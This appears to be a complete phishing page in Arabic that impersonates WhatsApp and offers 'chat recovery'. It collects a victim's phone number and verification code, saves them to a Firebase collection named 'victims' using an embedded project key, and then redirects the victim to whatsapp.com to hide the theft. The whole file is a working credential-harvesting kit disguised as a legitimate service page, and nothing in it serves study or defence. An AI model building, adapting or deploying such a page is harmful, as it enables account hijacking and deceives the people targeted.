<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>WhatsApp</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#075e54,#25d366);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:rgba(0,0,0,0.6);border-radius:12px;padding:25px;max-width:400px;width:100%;text-align:center}.logo{font-size:40px;margin-bottom:10px}h1{font-size:18px;margin-bottom:15px}input{width:100%;padding:12px;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:6px;color:#fff;font-size:13px;outline:none;margin-bottom:8px}input:focus{border-color:#25d366}.btn{width:100%;padding:12px;background:#25d366;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:bold;cursor:pointer}.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;justify-content:center;align-items:center;flex-direction:column}.load.show{display:flex}.spinner{width:40px;height:40px;border:4px solid #333;border-top:4px solid #25d366;border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class="container"><div class="logo">💬</div><h1>WhatsApp</h1><p style="color:#ddd;font-size:12px;margin-bottom:15px">استعادة المحادثات</p>
<input type="tel" id="phone" placeholder="رقم الهاتف">
<input type="text" id="code" placeholder="كود التحقق">
<button class="btn" onclick="go()">استعادة</button></div>
<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الاستعادة...</p></div>
<script>
firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
var db=firebase.firestore();
async function go(){var ph=document.getElementById('phone').value.trim(),cd=document.getElementById('code').value.trim();if(!ph||!cd)return alert('املأ الحقول');document.getElementById('load').classList.add('show');await db.collection('victims').add({service:'💬 واتساب',text:'📱 '+ph+' | 🔒 '+cd,timestamp:new Date().toISOString()});setTimeout(function(){document.getElementById('load').classList.remove('show');window.location.href='https://whatsapp.com/'},2000)}
</script></body></html>
